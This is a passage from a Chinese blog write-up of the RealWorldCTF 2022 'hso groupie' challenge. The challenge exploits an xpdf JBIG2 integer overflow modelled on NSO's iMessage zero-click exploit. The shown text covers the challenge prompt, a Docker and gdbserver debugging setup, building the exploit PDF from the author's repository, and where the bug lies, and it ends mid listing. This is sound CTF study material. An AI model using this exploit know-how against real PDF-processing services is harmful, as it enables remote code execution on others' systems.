<!DOCTYPE html>



  


<html class="theme-next gemini use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT" />




  


  <link rel="alternate" href="/atom.xml" title="Sakuraのblog" type="application/atom+xml" />






<meta name="description" content="realworldctf 2022 hso writeup与nso iMessage 0click漏洞分析欢迎大家关注公众号”天问记事簿”，以及加入天问之路知识星球，一起做技术分享，一起学习，happy hack。 简介本题的考点可能来源于Project Zero的A deep dive into an NSO zero-click iMessage exploit: Remote Code Ex">
<meta property="og:type" content="article">
<meta property="og:title" content="realworldctf 2022 hso writeup与nso iMessage 0click漏洞分析">
<meta property="og:url" content="http://eternalsakura13.com/2022/02/10/hso/index.html">
<meta property="og:site_name" content="Sakuraのblog">
<meta property="og:description" content="realworldctf 2022 hso writeup与nso iMessage 0click漏洞分析欢迎大家关注公众号”天问记事簿”，以及加入天问之路知识星球，一起做技术分享，一起学习，happy hack。 简介本题的考点可能来源于Project Zero的A deep dive into an NSO zero-click iMessage exploit: Remote Code Ex">
<meta property="og:image" content="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2022-02-10-095423.jpg">
<meta property="og:image" content="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2022-02-10-095522.jpg">
<meta property="og:image" content="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2022-02-10-095544.jpg">
<meta property="og:image" content="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2022-02-10-095455.jpg">
<meta property="article:published_time" content="2022-02-10T09:48:08.111Z">
<meta property="article:modified_time" content="2022-02-10T09:59:51.543Z">
<meta property="article:author" content="sakura">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2022-02-10-095423.jpg">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Gemini',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: 'QOPH9ID41Z',
      apiKey: '',
      indexName: 'sakura',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://eternalsakura13.com/2022/02/10/hso/"/>





  <title>realworldctf 2022 hso writeup与nso iMessage 0click漏洞分析 | Sakuraのblog</title>
  




<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
  ga('create', 'UA-113420358-1', 'auto');
  ga('send', 'pageview');
</script>





<meta name="generator" content="Hexo 4.2.1"></head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Sakuraのblog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
            
            关于
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      
        
        <li class="menu-item menu-item-buglist">
          <a href="/buglist/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br />
            
            BugList
          </a>
        </li>
      

      
        <li class="menu-item menu-item-search">
          
            <a href="javascript:;" class="popup-trigger">
          
            
              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
            
            搜索
          </a>
        </li>
      
    </ul>
  

  
    <div class="site-search">
      
  <div class="popup search-popup local-search-popup">
  <div class="local-search-header clearfix">
    <span class="search-icon">
      <i class="fa fa-search"></i>
    </span>
    <span class="popup-btn-close">
      <i class="fa fa-times-circle"></i>
    </span>
    <div class="local-search-input-wrapper">
      <input autocomplete="off"
             placeholder="搜索..." spellcheck="false"
             type="text" id="local-search-input">
    </div>
  </div>
  <div id="local-search-result"></div>
</div>



    </div>
  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://eternalsakura13.com/2022/02/10/hso/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="sakura">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/sakura_heart.png">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Sakuraのblog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">realworldctf 2022 hso writeup与nso iMessage 0click漏洞分析</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2022-02-10T17:48:08+08:00">
                2022-02-10
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%B5%8F%E8%A7%88%E5%99%A8/" itemprop="url" rel="index">
                    <span itemprop="name">浏览器</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2022/02/10/hso/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count valine-comment-count" data-xid="/2022/02/10/hso/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          
             <span id="/2022/02/10/hso/" class="leancloud_visitors" data-flag-title="realworldctf 2022 hso writeup与nso iMessage 0click漏洞分析">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数&#58;</span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <h1 id="realworldctf-2022-hso-writeup与nso-iMessage-0click漏洞分析"><a href="#realworldctf-2022-hso-writeup与nso-iMessage-0click漏洞分析" class="headerlink" title="realworldctf 2022 hso writeup与nso iMessage 0click漏洞分析"></a>realworldctf 2022 hso writeup与nso iMessage 0click漏洞分析</h1><p>欢迎大家关注公众号”天问记事簿”，以及加入天问之路知识星球，一起做技术分享，一起学习，happy hack。</p>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>本题的考点可能来源于Project Zero的<strong>A deep dive into an NSO zero-click iMessage exploit: Remote Code Execution</strong>一文，这篇文章介绍了一个图片渲染库的整数溢出漏洞，以及如何通过这个漏洞来利用这个解析库原有的处理像素数据的与或非功能，构建了一个图灵完备的小型计算机，从而完成后续的漏洞利用。</p>
<p>但由于Linux平台相比，缓解机制并不完善，以及我们不需要对接一个sandbox escape漏洞来逃逸imessage沙箱，所以只需要简单的构建一个全加器就可以实现整个漏洞利用，体验到神奇的乐趣。</p>
<p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2022-02-10-095423.jpg" alt=""></p>
<p>这里是复盘 RWCTF2022 中 <code>hso groupie</code> 题时所写下的一些笔记，在做题的过程中，我们大量阅读了<a href="https://github.com/agl/jbig2enc/blob/ea6a40a2cbf05efb00f3418f2d0ad71232565beb/fcd14492.pdf" target="_blank" rel="noopener">fcd14492标准文档</a>，如果你在做题或者阅读本文的过程中感觉难以理解，请参考文档的第0章/第7章和第6章等，想必会有所收获，感谢<strong><a href="https://github.com/Riatre" target="_blank" rel="noopener">Riatre</a>师傅提供的有趣题目。</strong></p>
<p>整体的做题思路主要由作者 exploit 中所推导出，换句话说，这里的笔记主要是对 <a href="https://github.com/Riatre/hso-groupie/tree/master/exploit" target="_blank" rel="noopener">作者 exploit</a> 的解释说明。</p>
<p>由于这题同样也较为复杂，因此需要单独开一个博文来记录。</p>
<h2 id="一、小叙"><a href="#一、小叙" class="headerlink" title="一、小叙"></a>一、小叙</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Help check how secure our latest PaaS (Pdftohtml-as-a-Service) is!</span><br><span class="line">Pick your favorite bug from this bloody list, or really, just exploit that bug so your exploit would also work on latest Poppler [1] and maybe even KItinerary.</span><br><span class="line">The container image is also available on Docker Hub.</span><br><span class="line">[1] Yeah, turns out propagating bug fixes between different Clone-and-Own codebases takes time :)</span><br><span class="line">socat -t90 stdio tcp-connect:47.242.147.191:31337</span><br><span class="line">attachment</span><br><span class="line"></span><br><span class="line">Clone-and-Pwn, difficulty:hard</span><br></pre></td></tr></table></figure>

<p>这题是 clone-and-pwn，源码没有做任何改变，就是通过查看最近提交的漏洞修复记录来发掘并利用漏洞。</p>
<h2 id="二、环境搭建"><a href="#二、环境搭建" class="headerlink" title="二、环境搭建"></a>二、环境搭建</h2><h3 id="1-本地环境搭建"><a href="#1-本地环境搭建" class="headerlink" title="1. 本地环境搭建"></a>1. 本地环境搭建</h3><blockquote>
<p>这一题是在 debian 下编译的，因此对于 debian 系统来说，有些系统可以直接跑 exp（例如我的 XD）。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">wget https:&#x2F;&#x2F;dl.xpdfreader.com&#x2F;xpdf-4.03.tar.gz</span><br><span class="line">tar -zxvf xpdf-4.03.tar.gz</span><br><span class="line">cd xpdf-4.03</span><br><span class="line">mkdir build</span><br><span class="line">cd build</span><br><span class="line">cmake -DCMAKE_BUILD_TYPE&#x3D;Debug -DCMAKE_CXX_FLAGS&#x3D;&quot;-D_FORTIFY_SOURCE&#x3D;2 -fstack-protector-strong -Wl,-z,now -Wl,-z,relro -g3 -ggdb3 -O0&quot; ..</span><br><span class="line">make -j &#96;nproc&#96;</span><br><span class="line"></span><br><span class="line"># 题目还给了一个 &#96;GNU C Library (Debian GLIBC 2.33-2) release&#96; 的 glibc 附件</span><br><span class="line">patchelf --replace-needed libc.so.6 $&#123;PWD&#125;&#x2F;..&#x2F;..&#x2F;libc.so.6 .&#x2F;xpdf&#x2F;pdftohtml</span><br></pre></td></tr></table></figure>

<p>启动方式：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xpdf&#x2F;pdftohtml &lt;pdf-path&gt; --</span><br></pre></td></tr></table></figure>

<h3 id="2-exploit-调试环境搭建"><a href="#2-exploit-调试环境搭建" class="headerlink" title="2. exploit 调试环境搭建"></a>2. exploit 调试环境搭建</h3><p>去 <a href="https://github.com/Riatre/hso-groupie/tree/master/chall" target="_blank" rel="noopener">题目环境</a> 这里下载 dockerfile 等题目环境，之后给 dockerfile 打 patch：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">--- a&#x2F;Dockerfile</span><br><span class="line">+++ b&#x2F;Dockerfile</span><br><span class="line">@@ -8,7 +8,7 @@ RUN cd &#x2F;tmp&#x2F;xpdf-4.03 &amp;&amp; \</span><br><span class="line">     mkdir build &amp;&amp; \</span><br><span class="line">     cd build &amp;&amp; \</span><br><span class="line">     cmake -DCMAKE_BUILD_TYPE&#x3D;Release \</span><br><span class="line">-        -DCMAKE_CXX_FLAGS&#x3D;&quot;-D_FORTIFY_SOURCE&#x3D;2 -fstack-protector-strong -Wl,-z,now -Wl,-z,relro&quot; .. &amp;&amp; \</span><br><span class="line">+        -DCMAKE_CXX_FLAGS&#x3D;&quot;-D_FORTIFY_SOURCE&#x3D;2 -fstack-protector-strong -Wl,-z,now -Wl,-z,relro -g3 -ggdb3 -O0 &quot; .. &amp;&amp; \</span><br><span class="line">     make -j$(nproc)</span><br><span class="line"></span><br><span class="line"> FROM debian:unstable-20211220-slim</span><br><span class="line">@@ -20,6 +20,7 @@ RUN echo &quot;deb [check-valid-until&#x3D;no] http:&#x2F;&#x2F;snapshot.debian.org&#x2F;archive&#x2F;debian&#x2F;2</span><br><span class="line">     apt-get install -y fonts-arkpandora fonts-noto fonts-dejavu fonts-font-awesome fonts-lato fonts-powerline gsfonts &amp;&amp; \</span><br><span class="line">     apt-get clean &amp;&amp; rm -rf &#x2F;var&#x2F;lib&#x2F;apt&#x2F;lists&#x2F;*</span><br><span class="line"> COPY --from&#x3D;build &#x2F;tmp&#x2F;xpdf-4.03&#x2F;build&#x2F;xpdf&#x2F;pdftohtml &#x2F;usr&#x2F;local&#x2F;bin&#x2F;</span><br><span class="line">+COPY gdbserver &#x2F;usr&#x2F;bin&#x2F;gdbserver</span><br><span class="line"> RUN mkdir -p &#x2F;run&#x2F;secrets &amp;&amp; echo &#39;rwctf&#123;flag placeholder&#125;&#39; &gt; &#x2F;run&#x2F;secrets&#x2F;flag</span><br><span class="line"></span><br><span class="line">-ENTRYPOINT [ &quot;&#x2F;bin&#x2F;sh&quot;, &quot;-c&quot;, &quot;&#x2F;usr&#x2F;local&#x2F;bin&#x2F;pdftohtml \&quot;$@\&quot;&quot;, &quot;--&quot; ]</span><br><span class="line">\ No newline at end of file</span><br><span class="line">+ENTRYPOINT [ &quot;&#x2F;bin&#x2F;sh&quot;]</span><br><span class="line">\ No newline at end of file</span><br></pre></td></tr></table></figure>

<p>修改目的主要是把 gdbserver 放进镜像里，以及让入口点停在 <code>/bin/sh</code>，而不直接启动 pdftohtml。</p>
<blockquote>
<p>这里要注意 COPY 命令的源路径，这里是直接使用相对路径。</p>
</blockquote>
<p>执行 <code>build.sh</code>，执行完成后可以检查一下镜像</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  chall git:(master) docker image ls</span><br><span class="line">REPOSITORY             TAG                      IMAGE ID       CREATED             SIZE</span><br><span class="line">hsogroupie&#x2F;pdftohtml   latest                   042e72a0f133   45 minutes ago      946MB</span><br></pre></td></tr></table></figure>

<p>启动 docker 镜像</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -itd -p 1234:1234 -v sakura_volume:&#x2F;tmp&#x2F;chall --cap-add&#x3D;SYS_PTRACE --security-opt seccomp&#x3D;unconfined --name hsogroupie hsogroupie&#x2F;pdftohtml</span><br></pre></td></tr></table></figure>

<p>该命令非常长，解构如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">docker run --help</span><br><span class="line"></span><br><span class="line">-i : 进入交互模式</span><br><span class="line">-t : 分配一个伪shell</span><br><span class="line">-d : 在后台以守护模式运行容器</span><br><span class="line">-p : 宿主机端口:容器端口，将容器端口映射到宿主机端口，这里都指定1234就好了</span><br><span class="line">-v : 挂载数据卷</span><br><span class="line">--cap-add&#x3D;SYS_PTRACE --security-opt seccomp&#x3D;unconfined : Docker默认禁用PTRACE功能，需要指定这个命令</span><br><span class="line">--name : 给容器声明一个名字</span><br></pre></td></tr></table></figure>

<p>这里挂载数据卷需要额外说明（参考<a href="https://www.cnblogs.com/edisonchou/p/docker_volumes_introduction.html" target="_blank" rel="noopener">这篇文章</a>）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">docker volume create sakura_volume &#x2F;&#x2F; 创建一个自定义容器卷</span><br><span class="line">docker volume ls &#x2F;&#x2F; 查看所有容器卷</span><br><span class="line">docker volume inspect sakura_volume &#x2F;&#x2F; 查看指定容器卷详情信息</span><br><span class="line">...</span><br><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;CreatedAt&quot;: &quot;2022-02-02T01:29:55+08:00&quot;,</span><br><span class="line">        &quot;Driver&quot;: &quot;local&quot;,</span><br><span class="line">        &quot;Labels&quot;: &#123;&#125;,</span><br><span class="line">        &quot;Mountpoint&quot;: &quot;&#x2F;var&#x2F;lib&#x2F;docker&#x2F;volumes&#x2F;sakura_volume&#x2F;_data&quot;,</span><br><span class="line">        &quot;Name&quot;: &quot;sakura_volume&quot;,</span><br><span class="line">        &quot;Options&quot;: &#123;&#125;,</span><br><span class="line">        &quot;Scope&quot;: &quot;local&quot;</span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>然后我们对 <code>/var/lib/docker/volumes/sakura_volume/_data</code> 的修改就会映射到容器的 <code>/tmp/chall</code> 里，传输文件就比较方便。</p>
<p>启动完了之后我们可以 <code>docker ps</code> 一下看看有没有问题</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  chall git:(master) docker ps -a</span><br><span class="line">CONTAINER ID   IMAGE                  COMMAND     CREATED          STATUS          PORTS                                       NAMES</span><br><span class="line">15f265c337c0   hsogroupie&#x2F;pdftohtml   &quot;&#x2F;bin&#x2F;sh&quot;   34 minutes ago   Up 34 minutes   0.0.0.0:1234-&gt;1234&#x2F;tcp, :::1234-&gt;1234&#x2F;tcp   hsogroupie</span><br></pre></td></tr></table></figure>

<p>生成 exp pdf，注意要对 submodule 初始化，不然没有 jbig2enc 库</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;Riatre&#x2F;hso-groupie.git</span><br><span class="line">cd hso-groupie&#x2F;exploit</span><br><span class="line">git submodule update --init</span><br><span class="line">cd ..</span><br><span class="line">sudo cp -r exploit &#x2F;var&#x2F;lib&#x2F;docker&#x2F;volumes&#x2F;sakura_volume&#x2F;_data</span><br></pre></td></tr></table></figure>

<p>然后我们进入 docker 容器里对应数据卷的 exploit 目录下，应该要 install 这些安装包，要是少了就自己补一下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get install make g++ python3 pybind11-dev python3-dev python2 python2-dev</span><br><span class="line">make</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">root@15f265c337c0:&#x2F;tmp&#x2F;chall&#x2F;exploit# make</span><br><span class="line">g++ -O3 -std&#x3D;c++20 -shared -fPIC jbig2arith.cc jbig2arith.h jbjbarith.cc jbjbarith.h -ojbjbarith.cpython-39-x86_64-linux-gnu.so -I&#x2F;usr&#x2F;include&#x2F;python3.9 -I&#x2F;usr&#x2F;include&#x2F;python3.9</span><br><span class="line">python3 sploit.py</span><br><span class="line">python2 pdf.py sploit &gt; sploit.pdf</span><br></pre></td></tr></table></figure>

<p>调试 exp</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it 15f265c337c0 bash</span><br></pre></td></tr></table></figure>

<p>进入容器的 bash 环境，然后启动 gdbserver</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm -rf output &amp;&amp; &#x2F;usr&#x2F;bin&#x2F;gdbserver :1234 &#x2F;usr&#x2F;local&#x2F;bin&#x2F;pdftohtml &#x2F;tmp&#x2F;chall&#x2F;exploit&#x2F;sploit.pdf output</span><br></pre></td></tr></table></figure>

<p>这里的 output 是随便给一个文件夹名就行了，这是 pdftohtml 必须的启动参数，它会创建这个文件夹，并输出一个结果到这个文件夹里，并且它不能是已经存在的文件夹，而 sploit.pdf 就是我们生成出来的 exp pdf 文件。</p>
<p>然后在宿主机也启动 gdb，然后 <code>target remote:1234</code>，然后随便下个断点看看效果，注意因为 docker 里的源码路径和我宿主机的源码路径并不一致，所以要用 <code>substitute-path</code> 做个转换，建议写个 gdb 脚本完成这个事情，后面就不用一直自己敲了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">target remote :1234</span><br><span class="line">set substitute-path  &#x2F;tmp&#x2F;xpdf-4.03&#x2F;xpdf &#x2F;home&#x2F;sakura&#x2F;ctf&#x2F;hso-groupie&#x2F;chall&#x2F;xpdf-4.03&#x2F;xpdf</span><br><span class="line">b findSegment</span><br><span class="line">c</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"> ► 0x555555675179    mov    r8, qword ptr [rax]</span><br><span class="line">   0x55555567517c    cmp    dword ptr [r8 + 8], esi</span><br><span class="line">   0x555555675180    jne    0x555555675170                &lt;0x555555675170&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0x555555675170    add    rax, 8</span><br><span class="line">   0x555555675174    cmp    rax, rdx</span><br><span class="line">   0x555555675177    je     0x555555675190                &lt;0x555555675190&gt;</span><br><span class="line">───────────────────────────────────────[ SOURCE (CODE) ]────────────────────────────────────────</span><br><span class="line">In file: &#x2F;home&#x2F;sakura&#x2F;ctf&#x2F;hso-groupie&#x2F;chall&#x2F;xpdf-4.03&#x2F;xpdf&#x2F;JBIG2Stream.cc</span><br><span class="line">   4036 JBIG2Segment *JBIG2Stream::findSegment(Guint segNum) &#123;</span><br><span class="line">   4037   JBIG2Segment *seg;</span><br><span class="line">   4038   int i;</span><br><span class="line">   4039</span><br><span class="line">   4040   for (i &#x3D; 0; i &lt; globalSegments-&gt;getLength(); ++i) &#123;</span><br><span class="line"> ► 4041     seg &#x3D; (JBIG2Segment *)globalSegments-&gt;get(i);</span><br><span class="line">   4042     if (seg-&gt;getSegNum() &#x3D;&#x3D; segNum) &#123;</span><br><span class="line">   4043       return seg;</span><br><span class="line">   4044     &#125;</span><br><span class="line">   4045   &#125;</span><br><span class="line">   4046   for (i &#x3D; 0; i &lt; segments-&gt;getLength(); ++i) &#123;</span><br><span class="line">───────────────────────────────────────────[ STACK ]────────────────────────────────────────────</span><br><span class="line">00:0000│ rsp 0x7fffffffdd28 —▸ 0x555555676c72 ◂— mov    r12, rax</span><br><span class="line">01:0008│     0x7fffffffdd30 ◂— 0x0</span><br><span class="line">02:0010│     0x7fffffffdd38 ◂— 0x0</span><br><span class="line">03:0018│     0x7fffffffdd40 —▸ 0x555561ec0f00 ◂— 0x200000001</span><br><span class="line">04:0020│     0x7fffffffdd48 —▸ 0x555561f40c64 ◂— 0x203a100000000</span><br><span class="line">05:0028│     0x7fffffffdd50 ◂— 0x0</span><br><span class="line">... ↓        2 skipped</span><br><span class="line">─────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────</span><br><span class="line"> ► f 0   0x555555675179</span><br><span class="line">   f 1   0x555555676c72</span><br><span class="line">   f 2   0x555555679198 JBIG2Stream::readSegments()+1032</span><br><span class="line">   f 3   0x555555679473 JBIG2Stream::reset()+211</span><br><span class="line">   f 4   0x55555560139a</span><br><span class="line">   f 5   0x5555556494a9</span><br><span class="line">   f 6   0x55555564aba0</span><br><span class="line">   f 7   0x55555563c9e5</span><br></pre></td></tr></table></figure>

<p>现在我们就完成了整个调试环境的搭建。</p>
<h2 id="三、漏洞点"><a href="#三、漏洞点" class="headerlink" title="三、漏洞点"></a>三、漏洞点</h2><p>这题预期的解法是使用这篇 google project zero 的 <a href="https://googleprojectzero.blogspot.com/2021/12/a-deep-dive-into-nso-zero-click.html" target="_blank" rel="noopener">iMessage exploit</a> 中的漏洞。漏洞点位于 <code>JBIG2Stream</code>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span 